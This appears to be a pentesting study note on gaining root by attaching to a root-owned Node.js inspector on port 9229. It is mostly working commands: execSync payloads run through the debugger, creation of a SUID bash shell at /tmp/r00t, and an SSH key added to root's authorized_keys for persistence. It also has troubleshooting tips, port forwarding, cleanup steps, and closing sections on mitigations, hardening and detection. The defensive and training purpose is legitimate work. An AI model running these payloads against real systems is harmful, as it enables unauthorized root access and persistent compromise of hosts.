## Overview

Node.js can expose an interactive debugging interface through the Node Inspector protocol.

If a privileged Node.js process is running with `--inspect` enabled, a local user may be able to connect to the inspector and execute JavaScript inside the running process.

If the process runs as root, JavaScript execution through the inspector becomes root-context command execution.

The general methodology is:

```text
Gain local shell
↓
Enumerate listening localhost services
↓
Identify Node Inspector on port 9229
↓
Find the owning Node process
↓
Confirm the process is running as root
↓
Connect with node inspect
↓
Confirm UID from inside the process
↓
Execute OS commands through child_process
↓
Create a controlled root shell or root proof
```

---

# Why Node Inspector Matters

Node Inspector is intended for debugging.

It can expose powerful runtime capabilities, including:

```text
inspecting variables
evaluating JavaScript
requiring modules
executing child processes
interacting with the application runtime
```

Dangerous pattern:

```bash
/usr/bin/node --inspect=127.0.0.1:9229 /path/to/app.js
```

Even when bound to `127.0.0.1`, any local user may be able to connect if no additional restrictions exist.

---

# Requirements

This technique requires:

```text
local shell access
node installed on the target
Node Inspector listening locally or remotely
access to the inspector port
target Node process running as a higher-privileged user
ability to evaluate JavaScript through the debugger
```

Common debug ports:

```text
9229
9230
custom ports passed to --inspect
```

Common process indicators:

```text
--inspect
--inspect=127.0.0.1:9229
--inspect=0.0.0.0:9229
--inspect-brk
node inspect
```

---

# 1. Enumerate Listening Ports

Use:

```bash
ss -tunlp
```

Look for:

```text
127.0.0.1:9229
0.0.0.0:9229
[::1]:9229
```

Example interesting output:

```text
tcp LISTEN 0 511 127.0.0.1:9229 0.0.0.0:*
```

Interpretation:

```text
A Node.js inspector/debug service may be listening locally.
```

---

# 2. Confirm Node Is Installed

```bash
which node
```

Expected:

```text
/usr/bin/node
```

Check version:

```bash
node -v
```

---

# 3. Identify Node Processes

```bash
ps aux | grep node
```

Look for:

```text
root ... /usr/bin/node --inspect=127.0.0.1:9229 /path/to/script.js
```

Important fields:

| Field | Why It Matters |
|---|---|
| Process owner | Determines privilege context |
| `--inspect` flag | Confirms inspector enabled |
| IP and port | Shows where to connect |
| Script path | Reveals application role |
| User | Root-owned process may allow root execution |

High-risk example:

```text
root 1291 ... /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
```

---

# 4. Confirm Port Ownership

If permissions allow:

```bash
lsof -i :9229
```

or:

```bash
ss -tunlp | grep 9229
```

If `lsof` is unavailable or restricted, use process listing:

```bash
ps aux | grep inspect
```

---

# 5. Connect to the Inspector

Use:

```bash
node inspect 127.0.0.1:9229
```

Expected successful connection:

```text
connecting to 127.0.0.1:9229 ... ok
debug>
```

If the inspector is on another port:

```bash
node inspect 127.0.0.1:<port>
```

---

# 6. Confirm Execution Context

Inside the debug prompt, check the UID:

```javascript
exec("process.getuid()")
```

Important result:

```text
0
```

Interpretation:

```text
Debugger code is executing inside a root-owned Node process.
```

If the result is not `0`, the technique may still provide code execution as another user, but not root.

---

# 7. Execute OS Commands

Node can execute OS commands through the `child_process` module.

Inside the debug prompt:

```javascript
exec("process.mainModule.require('child_process').execSync('id')")
```

If output is not readable, write it to a file:

```javascript
exec("process.mainModule.require('child_process').execSync('id > /tmp/node-debug-id')")
```

Then outside the debugger:

```bash
cat /tmp/node-debug-id
```

Alternative module reference:

```javascript
exec("require('child_process').execSync('id')")
```

---

# 8. Obtain Root Shell

## Option 1 – Create SUID Bash

Inside the debug prompt:

```javascript
exec("process.mainModule.require('child_process').execSync('cp /bin/bash /tmp/r00t && chmod +s /tmp/r00t')")
```

Exit the debugger:

```text
.exit
```

Confirm SUID bit:

```bash
ls -al /tmp/r00t
```

Expected:

```text
-rwsr-sr-x root root /tmp/r00t
```

Run with preserved privileges:

```bash
/tmp/r00t -p
```

Confirm:

```bash
id
whoami
```

Expected:

```text
euid=0(root)
root
```

> [!important]
> Bash requires `-p` to preserve effective privileges from the SUID bit.

---

## Option 2 – Write Root Proof File

For a safer validation:

```javascript
exec("process.mainModule.require('child_process').execSync('id > /tmp/root-proof')")
```

Check:

```bash
cat /tmp/root-proof
```

Expected:

```text
uid=0(root)
```

---

## Option 3 – Add Temporary SSH Key

Only use where explicitly allowed.

```javascript
exec("process.mainModule.require('child_process').execSync('mkdir -p /root/.ssh && echo <public_key> >> /root/.ssh/authorized_keys && chmod 700 /root/.ssh && chmod 600 /root/.ssh/authorized_keys')")
```

> [!warning]
> Adding SSH keys creates persistence. Avoid unless it is explicitly permitted by the rules of engagement.

---

# Why This Works

The escalation chain is:

```text
Node process runs as root
↓
Inspector is enabled
↓
Local user connects to inspector
↓
Debugger evaluates JavaScript inside the root process
↓
JavaScript loads child_process
↓
child_process executes OS commands as root
↓
Attacker creates a root-owned SUID binary or executes another controlled command
```

The vulnerable condition is:

```text
root-owned Node.js process with an accessible debug interface
```

---

# Practical Decision Tree

## Is there a localhost debug port?

Run:

```bash
ss -tunlp
```

If `127.0.0.1:9229` or similar appears, continue.

---

## Is the process Node.js?

Run:

```bash
ps aux | grep node
```

Look for:

```text
--inspect
--inspect-brk
9229
```

---

## Is the process root-owned?

If yes, the inspector may provide root-context execution.

If no, it may still allow access as the owning user.

---

## Can you connect?

```bash
node inspect 127.0.0.1:9229
```

If connection succeeds, check:

```javascript
exec("process.getuid()")
```

---

## Is UID 0?

If yes, execute a safe proof or create a root shell.

Safe proof:

```javascript
exec("process.mainModule.require('child_process').execSync('id > /tmp/node-debug-id')")
```

Root shell:

```javascript
exec("process.mainModule.require('child_process').execSync('cp /bin/bash /tmp/r00t && chmod +s /tmp/r00t')")
```

---

# Troubleshooting

## Cannot Connect to Inspector

Check:

```text
correct host and port
process still running
port bound to IPv4 or IPv6
node binary installed
current user can access local port
service restarted and changed port
```

Commands:

```bash
ss -tunlp | grep 9229
```

```bash
ps aux | grep inspect
```

---

## Port Is Not 9229

Search for all inspector flags:

```bash
ps aux | grep -E "inspect|node"
```

Look for:

```text
--inspect=<ip>:<port>
--inspect-brk=<ip>:<port>
```

---

## exec Fails

Try:

```javascript
exec("require('child_process').execSync('id')")
```

```javascript
exec("global.process.mainModule.require('child_process').execSync('id')")
```

```javascript
exec("process.mainModule.require('child_process').execSync('/usr/bin/id')")
```

---

## Output Is Not Displayed Clearly

Write command output to a file:

```javascript
exec("process.mainModule.require('child_process').execSync('id > /tmp/out')")
```

Then:

```bash
cat /tmp/out
```

---

## SUID Bash Does Not Work

Confirm permissions:

```bash
ls -al /tmp/r00t
```

Run with:

```bash
/tmp/r00t -p
```

Check whether `/tmp` is mounted with `nosuid`:

```bash
mount | grep /tmp
```

If `nosuid` is present, use a different writable path where SUID is honored, if one exists and is in scope.

---

## node Command Is Missing

If `node inspect` is unavailable but the debug port is accessible, consider:

```text
installing/using node from attacker-controlled path if allowed
SSH local port forwarding and attaching from attack host
using a compatible inspector client
```

Port forward from attacker machine if SSH access exists:

```bash
ssh -L 9229:127.0.0.1:9229 <user>@<target>
```

Then connect locally:

```bash
node inspect 127.0.0.1:9229
```

---

# Command Reference

## List listening ports

```bash
ss -tunlp
```

## Find Node

```bash
which node
```

## Show Node version

```bash
node -v
```

## Find Node processes

```bash
ps aux | grep node
```

## Find inspector processes

```bash
ps aux | grep inspect
```

## Connect to inspector

```bash
node inspect 127.0.0.1:9229
```

## Check UID in debugger

```javascript
exec("process.getuid()")
```

## Run `id` through Node

```javascript
exec("process.mainModule.require('child_process').execSync('id')")
```

## Write root proof

```javascript
exec("process.mainModule.require('child_process').execSync('id > /tmp/node-debug-id')")
```

## Create SUID Bash

```javascript
exec("process.mainModule.require('child_process').execSync('cp /bin/bash /tmp/r00t && chmod +s /tmp/r00t')")
```

## Confirm SUID Bash

```bash
ls -al /tmp/r00t
```

## Run SUID Bash

```bash
/tmp/r00t -p
```

## Confirm root

```bash
id
whoami
```

## SSH port forward inspector

```bash
ssh -L 9229:127.0.0.1:9229 <user>@<target>
```

---

# Cleanup Checklist

Remove temporary SUID binary:

```bash
rm -f /tmp/r00t
```

Remove proof files:

```bash
rm -f /tmp/node-debug-id
rm -f /tmp/out
rm -f /tmp/root-proof
```

Remove temporary SSH keys if added and permitted cleanup is required:

```bash
sed -i '/<key_identifier>/d' /root/.ssh/authorized_keys
```

Document:

```text
inspector address and port
root-owned Node process command line
UID confirmation
command executed
temporary files created
cleanup actions
```

---

# Defensive Notes

## Root Cause

The issue is caused by exposing a privileged Node.js debugging interface.

Dangerous configuration:

```bash
/usr/bin/node --inspect=127.0.0.1:9229 /path/to/script.js
```

Even when bound to localhost, any local user may be able to access it after obtaining a low-privileged shell.

---

# Mitigations

Defensive actions:

```text
never enable --inspect in production
never run Node.js services as root
bind debug interfaces only in isolated development environments
use dedicated low-privileged service accounts
restrict localhost debug ports where possible
remove debug flags from systemd services
monitor for node inspect usage
monitor for unexpected child_process execution
```

---

# systemd Hardening Ideas

Use a dedicated user:

```ini
User=nodeapp
Group=nodeapp
```

Restrict privilege gain:

```ini
NoNewPrivileges=true
```

Limit filesystem access:

```ini
ProtectSystem=strict
ProtectHome=true
PrivateTmp=true
```

Allow only required write paths:

```ini
ReadWritePaths=/var/log/app
```

Avoid debug flags:

```ini
ExecStart=/usr/bin/node /opt/app/worker.js
```

---

# Detection Ideas

Monitor for:

```text
node --inspect
node --inspect-brk
node inspect 127.0.0.1:9229
connections to 127.0.0.1:9229
child_process.execSync
cp /bin/bash /tmp/
chmod +s
SUID files created in /tmp
bash -p
```

Suspicious process chain:

```text
node --inspect
↓
debugger connection
↓
child_process.execSync
↓
cp /bin/bash /tmp/r00t
↓
chmod +s /tmp/r00t
↓
/tmp/r00t -p
```

---

# Key Takeaways

- Always check localhost services during Linux privilege escalation.
- Node Inspector commonly listens on port `9229`.
- A root-owned Node process with `--inspect` enabled can expose root-context code execution.
- `node inspect 127.0.0.1:9229` can attach to the debugger.
- `exec("process.getuid()")` confirms the privilege context.
- `child_process.execSync()` can execute OS commands from the debug session.
- SUID Bash with `bash -p` is a common lab method for obtaining a root-effective shell.
- The defensive fix is to disable inspector in production and avoid running Node.js as root.

---

# Related Notes

- [[Linux Privilege Escalation]]
- [[Node.js]]
- [[Node Inspector]]
- [[Debug Port Abuse]]
- [[Localhost Services]]
- [[SUID]]
- [[Bash -p]]
- [[Linux Enumeration]]
- [[Process Enumeration]]
- [[systemd Hardening]]

---

# Tags

#linux
#privilege-escalation
#nodejs
#node-inspector
#debug-port
#localhost
#suid
#bash-p
#child-process
#execsync
#pentesting